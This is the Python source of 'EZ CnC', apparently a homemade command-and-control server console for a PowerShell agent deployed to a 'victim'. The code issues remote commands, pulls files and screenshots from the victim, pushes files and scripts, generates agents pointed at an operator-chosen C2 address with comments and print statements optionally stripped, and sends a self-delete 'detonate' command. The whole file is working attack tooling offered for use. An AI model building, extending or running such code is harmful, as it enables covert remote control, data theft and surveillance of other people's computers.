#!/usr/bin/env python3 

#########
## Version 0.5.0 of the EZ CnC

##
## COMPLETE: HTTPS
## COMPLETE: Screenshots 
## COMPLETE: COmmands via GET
## COMPLETE: Uploads to victim
## COMPLETE: Downloads from victim
## COMPLETE: Sleep Variable
## COMPLETE: Generate victim.ps1 on fly (config.sh .. to config.py)
## COMPLETE: Add custom Port when starting commandServer.py
## COMPLETE: Server IP 
## COMPLETE: Add Logging capabilities of output
## TODO: Add Better Logging capabilities (only does GET commands currently)
## COMPLETE: Global Variables
## COMPLETE: How to run script
## COMPLETE: Require -p 8080 port
## COMPLETE: Argument precheck
## COMPLETE: Argument While Loop
## COMPLETE: Start eguiHTTPS.py and server.py
## COMPLETE: Cat the Banner.txt
## COMPLETE: Print Help functionality
## COMPLETE: Keyboard while loop (wait for key press)
## COMPLETE: Main While Loop
## COMPLETE: Cleanup Script
## TODO: Have a 'snapshot'.. where it enumerates the host and sends it back 
## TODO: Performs searches ?
## COMPLETE: Run custom scripts from ./Scripts/
## COMPLETE: Better user input functions.. if/else not sustainable. Fixed, added functions
## COMPLETE: Add Local Command capability
## COMPLETE: Added functions for each Item, such as 1, 2,3,shell, etc.
## COMPLETE: Began clearscreen/server details at the top
## COMPLETE: CONVERTED TO Python3


######
# IMPORT
######
import sys
import argparse
import time
import os
import subprocess
import psutil
import base64
import shutil
import socket

######
## GLOBAL VARIABLES
######
SLEEP=(5) # Global sleep variable
pwd = os.getcwd() # Get current working directory
cc=(pwd + '/WebOnly/cc.js') # path of cc.js
eguiHTTPS=(pwd + '/ServerRequirements/eguiHTTPS.py') # path of eguiHTTPS.py
server=(pwd + '/ServerRequirements/server.py') # path of the server.py
lastCommand_input = '' # Keep track of the last command 
lastUser_input = '' # keep track of the last user input
additionalPort = int() # Global variable for the While True loop at the bottom
serverPortList = [] # Server Port List for tracking additional ports

#########
## COLOR VARIABLES
colorGreen = "\033[1;32;40m"
colorBlack = "\033[0;37;40m"
colorRed = "\033[1;31;40m"
colorYellow = "\033[1;33;40m"
colorBlue = "\033[1;34;40m"
"""
1 = *
2 = +
3 = !
4 = -
"""
green1 = "\033[1;32;40m[*]\033[0;37;40m"
green2 = "\033[1;32;40m[+]\033[0;37;40m"
green3 = "\033[1;32;40m[!]\033[0;37;40m"
green4= "\033[1;32;40m[-]\033[0;37;40m"
yellow1 = "\033[1;33;40m[*]\033[0;37;40m"
yellow2 = "\033[1;33;40m[+]\033[0;37;40m"
yellow3 = "\033[1;33;40m[!]\033[0;37;40m"
yellow4 = "\033[1;33;40m[-]\033[0;37;40m"
red1 = "\033[1;31;40m[*]\033[0;37;40m"
red2 = "\033[1;31;40m[+]\033[0;37;40m"
red3 = "\033[1;31;40m[!]\033[0;37;40m"
red4 = "\033[1;31;40m[-]\033[0;37;40m"
## END COLOR VARIABLES
###########



#######
## Define Functions
#######

def bannerFunc():
    # BANNER COMPLETE
    f = open('BANNER.txt', 'r').read()
    print(f)

def cleanupFunc():
    print((green3 + " Cleaning up.."))
    processes = {'eguiHTTPS.py', 'server.py'}
    for proc in psutil.process_iter():
        # check whether the process name matches
        if proc.name() in processes:
            proc.kill()
    time.sleep(2)
    print((green3 + " Server successfully shutdown, Goodbye!"))



def keyboardFunc():
    try:
        input(green3 + " Press Enter to continue...")
    except SyntaxError:
        pass

def howToFunc():
    # MAYBE
    print((colorGreen + "[*] -------------------------------------- [*]" + colorBlack))
    print((green1 + " Type " \
            + colorBlue + "1" + colorBlack + " to run a command"))
    print((green1 + " Type " \
            + colorBlue + "2" + colorBlack + " to download a file from victim"))
    print((green1 + " Type " \
            + colorBlue + "3" + colorBlack + " to upload a file to victim"))
    print((green1 + " Type " \
            + colorBlue + "4" + colorBlack + " to take a screenshot"))
    print((green1 + " Type " \
            + colorBlue + "5" + colorBlack + " to run a script"))
    print((green1 + " Type " \
            + colorBlue + "6" + colorBlack + " to configure an agent"))
    print((green1 + " Type " \
            + colorBlue + "7" + colorBlack + " to change server port"))
    print((green1 + " Type " \
            + colorBlue + "shell" + colorBlack + " to run a local shell command"))
    print((green1 + " Type " \
            + colorBlue + "detonate" + colorBlack + " to detonate remote agent"))
    print((green1 + " Type " \
            + colorBlue + "q" + colorBlack + " or " \
            + colorBlue + "Q" + colorBlack + " to shutdown"))

def mainLoopFunc(user_input):
    # Main Loop
    # Valid Commands
    commandList = ['1', '2', '3', '4', '5', '6', '7', 'shell', 'detonate', 'q', 'Q']
    ## FUNCTION VARIABLES referenced outside of function later
    mainLoopFunc.command_input = ''
    mainLoopFunc.serverPort = int()
    ######
    # Config Variables
    skeleton = './AgentRequirements/template.ps1'
    finalAgent = './AgentRequirements/EZCNC-Agent.ps1'
    finalTemp = './AgentRequirements/finalTemp.ps1'
    temp = './AgentRequirements/temporary.ps1'
    cert = "./ServerRequirements/server.pem"
    # End Config Variables
    #######
    # Create Temp File
    if os.path.exists(temp):
        None
    else:
        f = open(temp,'w')
        f.close()

    ###
    # Certificate Func for Agent
    ###
    def certificateFunc():
        while True:
            user_input = str(input(yellow3 + " Do you wish to create a Self Signed Cert?\n" + yellow2 + " Type 'yes' or 'no'\n"))
            #print(user_input)

            if user_input.lower() == 'yes':
                print(green1 + " Generating Self-Signed Certificate...")
                os.system("openssl req -new -x509 -keyout " + cert + " -out " + cert + " -days 365 -nodes -subj '/C=US' >/dev/null 2>&1")
                print((green1 + " Certificate created and written to " + cert))
                break
            elif user_input.lower() == 'no':
                print(green1 + " No problem.. but make sure you have your own certificate located in ./ServerRequirements named 'server.pem'")
                break
            else:
                print(red4 + ' Invalid command.. try again')
                continue

    ###
    # Cleanup Function - Rename Temp to Final for Agent
    ###
    def agentCleanupFunc():
        if os.path.exists(finalTemp):
            print(green1 + ' Cleaning up...')
            #print('[*] Renaming ' + finalTemp + ' to ' + finalAgent)
            os.rename(finalTemp, finalAgent)
            print((green1 + ' Final Agent file is located in ' + finalAgent))
            print(green1 + ' Next Steps..')
            print('')
            print((colorBlue + '[1] Deploy ' + finalAgent + ' Agent to Victim' + colorBlack))
            print((colorBlue + '[2] Run ' + finalAgent + colorBlack))
            print(colorBlue + '[3] Run commandServer.py to Launch CNC Server and specify the proper Port #' + colorBlack)
        else:
            print('temp was never here')
            None

    ###
    # Remove Print Statements Function for Agent
    ###
    def removePrintStatements():
        while True:
            s = open(finalTemp, "r").read() # Open Final Name
            user_input = str(input(yellow3 + " Do you wish to strip print statements from final Agent File?" + '\n' + yellow2 +  " Type 'yes' or 'no'" + '\n'))
    
            #print(user_input)
            # Print Temp Function Variable
            printTemp = "printTemp"
            if user_input.lower() == 'yes':
                g = open(printTemp, "w")
                for line in s.splitlines():
                    if not (line.startswith('Write-Output') or line.startswith('    Write-Output') or line.startswith('        Write-Output') or line.startswith('write-host') or line.startswith('    write-host') or line.startswith('        write-host')):
                        g.write(line + '\n')
                g.close()
                os.rename(printTemp, finalTemp)
                print(green1 + " Removed Print Statements")
                #print('[*] Renamed custom ' + printTemp + ' to ' + finalTemp)
                break
            elif user_input.lower() == 'no':
                print(green3 + " Leaving print statements..")
                break
            else:
                print(red4 + " Invalid command.. try again")
                continue

    ###
    # Strip Comments Function for Agent
    ###
    def stripCommentsFunc():
        while True:
            # Vriable for reading finalName
            #print('[!] Opening Temp File..')
            s = open(temp, 'r').read()
            user_input = str(input(yellow3 + " Do you wish to strip comments from final Agent File?" + '\n' + yellow2 + " Type 'yes' or 'no'" + '\n'))

            #print(user_input)

            if user_input.lower() == 'yes':
                print(green3 + " Commenting out File...")

                # Create SECOND TEMP
                #print('!] Writing to Final Temp')
                g = open(finalTemp, "w")
                for line in s.splitlines():
                    if not (line.startswith('#') or line.startswith('    #') or line.startswith('        #')):
                        g.write(line + '\n')
                g.close()
                # New Agent created, so delete old agent
                os.remove(temp)
                
                ### REPLACE END COMMENTS WITH #>
                #print('[!] Now replacing END COMMENTS with #>')
                with open(finalTemp, 'r') as f:
                    for line in f:
                        line = line.replace('END COMMENTS', '#>')
                        i = open('commentTemp', 'a')
                        i.write(line)
                        i.close
                if os.path.exists('commentTemp'):
                    os.rename('commentTemp', finalTemp)
                else:
                    None # Do Nothing
                #print('[!] Just created ' + finalTemp + ' and removed ' + temp)

                break
            elif user_input.lower() == 'no':
                print(yellow3 + " Leaving comments...")
                # Rename old file to new agent
                os.rename(temp, finalTemp)
                #print('[!] Renaming Print Statement ' + temp + ' to ' + finalTemp)
                break
            else:
                print(red4 + " Invalid command.. try again")
                continue

    ######
    ## Add Server Port Function for Agent
    #####
    def addServerPortFunc():
        #sys.stdout.write("[+] What is the IP Address of the Server\n")
        #sys.stdout.flush()
        #ip = sys.stdin.readline()
        print(yellow2 + " What is the IP Address of the Server")
        ip = str(input(""))
        print(yellow2 + " What is the Port you want to listen on")
        port = str(input())
        print((green3 + ' Server is ' + ip + ':' + port))
        server = (ip+':'+port)

        # Old line and New Line
        old = '$ccserver = "192.168.9.4:8080"'
        new = '$ccserver = "' + server + '"'

        # Open the temporary.ps1 and replace with user input of C&C Server
        with open(skeleton, 'r') as f:
            for line in f:
                line = line.replace(old, new)
                i = open(temp, 'a')
                i.write(line)
                i.close
        #print('[!] Temporary has been APPENDED with Server:Port')


    # Command Function
    def command():
        #print('its an command')
        #print("COMMAND!")
        mainLoopFunc.command_input = input(yellow1 + " What command do you want to run?\n")

        #print("Command is " + command_input)

        # Write command to cc
        f = open (cc, 'w')
        f.write(user_input + '\n')
        f.write(mainLoopFunc.command_input + '\n')
        f.close()

        # Sleep a moment to refresh stuff
        time.sleep(SLEEP)
    
    # Download Function
    def download():
        #print('its a download')
        #print(green3 + "DOWNLOAD FROM VICTIM")
        mainLoopFunc.command_input = input(yellow1 + " What file do you want to Download from Victim?\n")

        # Write command to cc
        f = open (cc, 'w')
        f.write(user_input + '\n')
        f.write(mainLoopFunc.command_input + '\n')
        f.close()

        print((yellow1 + " Waiting for results.."))

        time.sleep(SLEEP)
        time.sleep(SLEEP)

        # Change name from FILENAME (created in eguiHTTPS.py) to real Filename
        os.rename('./WebOnly/FILENAME', './Files/' + mainLoopFunc.command_input)
        time.sleep(2)
        print((green3 + " " + mainLoopFunc.command_input + " has been downloaded and saved to " + pwd + '/Files/' + mainLoopFunc.command_input))



    def upload():
        #print('its a upload')
        #print("UPLOAD TO VICTIM")
        mainLoopFunc.command_input = input(yellow2 + " What file do you want to Upload to Victim?\n")

        # Write command to cc
        f = open (cc, 'w')
        f.write(user_input + '\n')
        f.write(mainLoopFunc.command_input + '\n')
        f.close()

        # Copy file you want to upload (located in ./Files/) to ./WebOnly/
        shutil.copy('./Files/' + mainLoopFunc.command_input, './WebOnly/')

        print((yellow1 + " Uploading file to Victim..."))
        time.sleep(SLEEP)
        print((yellow1 + " Let's make sure it's there.."))


        # Validate it's there by running "dir <file>" on victim
        f = open (cc, 'w')
        f.write("1\n")
        f.write("dir " + mainLoopFunc.command_input)
        f.close()

        # Sleep to make sure
        time.sleep(SLEEP)
        time.sleep(SLEEP)

        # Remove the file we temporarily moved to ./WebOnly
        os.remove('./WebOnly/' + mainLoopFunc.command_input)


    def screenCap():
        print((yellow1 + " Performing Screen Capture..."))


        # Blank out cc.js
        f = open (cc, 'w')
        f.write("")
        f.close()
        time.sleep(SLEEP)
        time.sleep(SLEEP)
        # Write command to cc
        f = open (cc, 'w')
        f.write(user_input + '\n')
        f.write(user_input + '\n')
        f.close()

        time.sleep(3)
        print((green3 + " Screen Capture Complete!"))
        time.sleep(1)
        print((yellow1 + " Grabbing Screen Capture..."))

        time.sleep(3)

        # Make Date File for Screenshot name
        dateFile = ("screenshot-" + time.strftime("%Y%m%d-%H%M%S") + ".bmp")

        time.sleep(20)
        # Read downloaded Screenshot1.bmp (which is base64 encoded) and decode it into a file with dateFile .. save it to Screenshots directory
        f = open(pwd + '/WebOnly/screenshot1.bmp', 'r').read()
        g = open('./Screenshots/' + dateFile, 'wb')
        
        decoded = base64.b64decode(f) # g needs to be opened in wb
        g.write(decoded)# g needs to be opened with wb

        g.close()

        # Remove screenshot uploaded.. since it is renamed in ./Screenshots/ directory
        os.remove(pwd + '/WebOnly/screenshot1.bmp')
        time.sleep(SLEEP)


    def shell():
        # Get input from user and use os.system to run the command
        mainLoopFunc.command_input = input(yellow2 + ' What local command do you want to run?\n')
        output = os.popen(mainLoopFunc.command_input).read() # Read raw_input, execute and save to variable

        #output = os.system(command)
        print((colorGreen + str(output) + colorBlack))


        #time.sleep(2)


    def panic():
        mainLoopFunc.command_input = input(red2 + " You have requested to detonate the agent. Are you sure? 'yes' or 'no'\n")
        if mainLoopFunc.command_input == 'yes':
            command2 = input(red3 + " To make sure you really want this, type 'yes' again\n")

            if command2 == 'yes':
                # SEND THE RM ./EZ-AGENT.ps1' command
                # TODO: SEND A CUSTOM MESSAGE TO AGENT
                # TODO: ADD LOOP ON AGENT.PS1.. if CUSTOM MESSAGE, KILL powershell
                print((red4 + " Executing detonation..."))

                f = open (cc, 'w')
                f.write('detonate\n')
                f.write('rm .\EZCNC-Agent.ps1\n')
                f.close()
                time.sleep(SLEEP)
                print((red4 + " BOOM!! Agent destroyed.. Goodbye.."))

                #continue
                #break # break command2 if
                pass
            else:
                print((red1 + " Good call! Not today.."))
                #continue # break command2 else
                pass
        else:
            print((red1 + " Good call! Not today.."))

            #continue # break for "if yes"
            pass
        #continue # Continue for elif
        pass

    def runScripts():
        ######
        # WORKS
        # TODO: Right now it saves everything as file. Need to differentiate a 'program' script or an 'output' script
        # TODO: Might be as simple as creating a sub folder too?
        # From ListScripts function
        scripts = os.listdir('./Scripts/')
        totalScripts = (len(scripts))

        #print("Below are the items")
        for list in scripts:
            print((yellow2 + " Choose: " + str(scripts.index(list)+1) + " for " + list))


        #print("There are a total of " + str(totalScripts))

        while True:
            try:
                mainLoopFunc.command_input = int(input(yellow2 + " Choose the Script # or '0' to quit\n"))

            except ValueError:
                print("[-] That's not a number!")
            else:
                if mainLoopFunc.command_input == 0:
                    print((red4 + " Okay we leave, goodbye"))

                    break
                
                elif 1 <= mainLoopFunc.command_input <= int(totalScripts):
                    
                    new = (int(mainLoopFunc.command_input) -1)
                    choice = str(scripts[new])
                    print((green1 + " You chose script: " + choice))

                    second_input = str(input(yellow3 + " Are you sure you want to run?? 'yes' or 'no'\n"))
                    if second_input == 'no':
                        print((red1 + " Good catch, leaving.."))

                        break
                    elif second_input == 'yes':
                        #print("Good job!")
                        #print("TODO: STILL WORKING ON THIS")
                        # Below works
                        # Write '3' to cc and the script name
                        f = open (cc, 'w')
                        f.write(user_input + '\n')
                        f.write(choice + '\n')
                        f.close()

                        # Move script to "./WebOnly"
                        shutil.copy('./Scripts/' + choice, './WebOnly/')
                        
                        #####
                        # FLUFF SLEEP
                        # SCRIPT IS NOW DEPLOYED.. 30 sec minimum wait
                        print((yellow1 + " Script has been deployed..."))
                        # Just wait a bit
                        time.sleep(5)
                        print((yellow1 + " Script is now running on victim..."))
                        time.sleep(5)
                        #print("[!] Script is being processed...")
                        time.sleep(10)
                        print((yellow1 + " Output it being uploaded..."))

                        # END FLUFF SLEEP
                        ######

                        # Update cc.js with 'download from victim' command..
                        # Upload the results "scriptoutput.txt" 
                        f = open(cc,'w')
                        f.write('2\n')
                        f.write('ScriptOutput.txt\n')
                        f.close()

                        time.sleep(10)
                        print((yellow1 + " Waiting for results..."))

                        time.sleep(10)


                        # Rename file to script name with timestamp
                        # This file si created from the above "download from victim" since it's name is "FILENAME" inside WebOnly
                        os.rename('./WebOnly/FILENAME', './Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt")
                        time.sleep(2)

                        # Print completion
                        print((green1 + ' ' + choice + " has been completed and results have been saved to:\n " + pwd + '/Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt"))                      


                        # Remove the choice.ps1 from WebOnly
                        os.remove('./WebOnly/' + choice)
                        break

                    else:
                        print((yellow3 + " Choose 'yes' or 'no'"))
                        continue
                else:
                    print((red4 + " Out of Range, try again!"))

                    continue

    # Have a way to Add/Remove Ports
    def serverPort():

        # Ask if you want to add/remove port
        mainLoopFunc.command_input = input(yellow2 + " Do you want to " + \
                colorBlue + "'add'" + colorBlack + \
                " or " + \
                colorBlue + "'remove'" + colorBlack + \
                " a port?\n")
        #print("Server Port List is: " + str(serverPortList))
        if mainLoopFunc.command_input == 'add':
            ######
            # THIS OPENS A PORT
            addPort = input(yellow2 + " What port do you want the server to listen on?\n") # changed mainLoopFunc.command_input to "addPort"
            mainLoopFunc.serverPort = addPort
            subprocess.Popen(['./ServerRequirements/eguiHTTPS.py', mainLoopFunc.serverPort], shell=False)
            #print(green3 + " Server is now listening on " + colorGreen + mainLoopFunc.serverPort + colorBlack) # Not needed since eguiHTTPS prints it
            # END OPEN PORT
            #######
            # Appends the opened port to the global list serverPortList
            serverPortList.append(mainLoopFunc.serverPort)
            print(green2 + " Adding Port " + mainLoopFunc.serverPort)
        elif mainLoopFunc.command_input == 'remove':
            # TODO: create a way to remove port
            print(yellow1 + " Currently the following ports are listening: ")
            for port in serverPortList: # Print list of items in "serverPortList" which should be ports started
                print(colorBlue + str(port) + colorBlack)
            
            removePort = input(yellow2 + "Which port do you want to remove?\n")
            
            # Loop to make sure it matches
            if any(item.lower() == removePort.lower() for item in serverPortList):
                ####################################################
                ##### ISSUES WITH INDEX RANGE WHEN EMPTYING ########
                print("Current Server Port List is: " + str(serverPortList))
                print(red3 + "Removing: " + removePort)
                serverPortList.remove(removePort) 
                print("Current Server Port List is now: " + str(serverPortList))
                print("Still removing " + removePort)
                PROCNAME = "eguiHTTPS.py"
                # Prevent IndexError index out of range
                # Right now there's an index error if you delete in different orders.
                print("Running kill command first")
                for proc in psutil.process_iter():
                    if proc.name() in PROCNAME:
                        #if str(proc.cmdline()[2]) == str(removePort):
                        if proc.cmdline()[2] == removePort:
                            print(green3 + ' Its a match: ' + str(proc.cmdline()[2]))
                            proc.kill()
                ###### STILL NOT COMPLETE #########
                ###################################
            else:
                print(red4 + " Didn't match")
    
        else:
            print(red4 + " Not a valid option")

    def quit():
        cleanupFunc()
        sys.exit()


    def Quit():
        cleanupFunc()
        sys.exit()


    if user_input == '1':
        command()
        print((yellow1 + " Waiting for results.."))
    elif user_input == '2':
        download()
        print((yellow1 + " Waiting for results.."))
    elif user_input == '3':
        upload()
        print((yellow1 + " Waiting for results.."))
    elif user_input == '4':
        screenCap()
        print((yellow1 + " Waiting for results.."))

    elif user_input == 'shell':
        shell()
    elif user_input == 'detonate':
        panic()
    elif user_input == '5':
        runScripts()
    elif user_input == '6':
        # Run the Agent Function list
        addServerPortFunc()
        stripCommentsFunc()
        removePrintStatements()
        certificateFunc()
        agentCleanupFunc()
    elif user_input == '7':
        print("Still working on this")
        serverPort()
    elif user_input == 'q':
        quit()
    elif user_input == 'Q':
        Quit()
    elif any(item.lower() == user_input.lower() for item in commandList):
        pass
    else:
        print((red3 + " Invalid command.. let's start over"))


    time.sleep(10)

def main():
    # CLEAR SCREEN AT START OF SCRIPT
    #_ = os.system('clear')
    # Define Main variable?


    # ARG PARSER BELOW
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', type=int, default='8000', metavar='<Port Number>',
        required=True,
        help="Provide a port the server will listen on")
    args = parser.parse_args()
    main.port = sys.argv[2]
    #print('Your port is ' + port) # Not needed

    ###############################
    # BEGIN STARTUP
    # Run eguiHTTPS: Use the port established from arguments, save web logs to ./ServerRequirements/log.txt
    # Run server.py: Checks log.txt and does base64 decode of the results
    subprocess.Popen(['./ServerRequirements/eguiHTTPS.py', main.port], shell=False) 
    subprocess.Popen(['./ServerRequirements/server.py'], shell=False)
    # Clear cc.js
    f = open(cc, 'w')
    f.write('')
    f.close()
    # Create Temp Log file
    f = open('./Logs/temp.txt', 'w')
    f.write('')
    f.close()
    # END STARTUP
    #################################


if __name__ == "__main__":
    main()
    
    # Sleep as things get in place
    time.sleep(5)

    # Print the Banner
    bannerFunc()
    time.sleep(2)

    # Run the Keyboard Function
    keyboardFunc()
    time.sleep(2)
    # Clear Screen
    _ = os.system('clear')


    
    # Main Loop Function
    #mainLoopFunc()
    while True:
        # Print Last User Input
        print(("Last User Selection was: " + colorYellow + str(lastUser_input) + colorBlack))
        # Print Last COmmand Input
        print(("Last Command Input was: " + colorYellow + str(lastCommand_input) + colorBlack))
        # Print output from last command. Open up a temp file that is being printed to from server.py
        e = open("./Logs/temp.txt", "r")
        print((colorGreen + e.read() + colorBlack))

        e.close()
        
        # Current Server Port
        a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        location = ("127.0.0.1", int(main.port))
        result_of_check = a_socket.connect_ex(location)
        if result_of_check == 0:
            print(("Server is listening on Port: " + colorGreen + main.port + colorBlack + \
                    " and is " + colorGreen + "Open" + colorBlack))
        else:
            print(("Server is listening on Port: : " + colorRed + main.port + colorBlack + \
                    " and is " + colorRed + "Closed" + colorBlack))

        a_socket.close()

        # Check if Additional Server Ports are running
        for port in serverPortList: 
            a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            location = ("127.0.0.1", int(port))
            result_of_check = a_socket.connect_ex(location)
            if result_of_check == 0:
                print(("Additional listening Port is: " + colorGreen + port + colorBlack + \
                        " and is " + colorGreen + "Open" + colorBlack))
            else:
                print(("Additional listening Port is: " + colorRed + port + colorBlack + \
                        " and is " + colorRed + "Closed" + colorBlack))
            a_socket.close()

        print('')

        

        howToFunc()
        user_input = str(input(yellow1 + \

                " Type " + colorBlue + "1" + colorBlack + \
                ", " + colorBlue + "2" + colorBlack + \
                ", " + colorBlue + "3" + colorBlack + \
                ", " + colorBlue + "4" + colorBlack + \
                ", " + colorBlue + "5" + colorBlack + \
                ", " + colorBlue + "6" + colorBlack + \
                ", " + colorBlue + "7" + colorBlack + \
                ", " + colorBlue + "shell" + colorBlack + \
                ", " + colorBlue + "detonate" + colorBlack + \
                ", or " + colorBlue + "q" + colorBlack + \
                "/" + colorBlue + "Q" + colorBlack + "\n"))
        mainLoopFunc(user_input)
        lastUser_input = user_input
        lastCommand_input = mainLoopFunc.command_input
        additionalPort = mainLoopFunc.serverPort
        #print("additionalPort is: " + str(additionalPort))
        
        _ = os.system('clear')
    
    # Run the cleanup Function
    cleanupFunc()
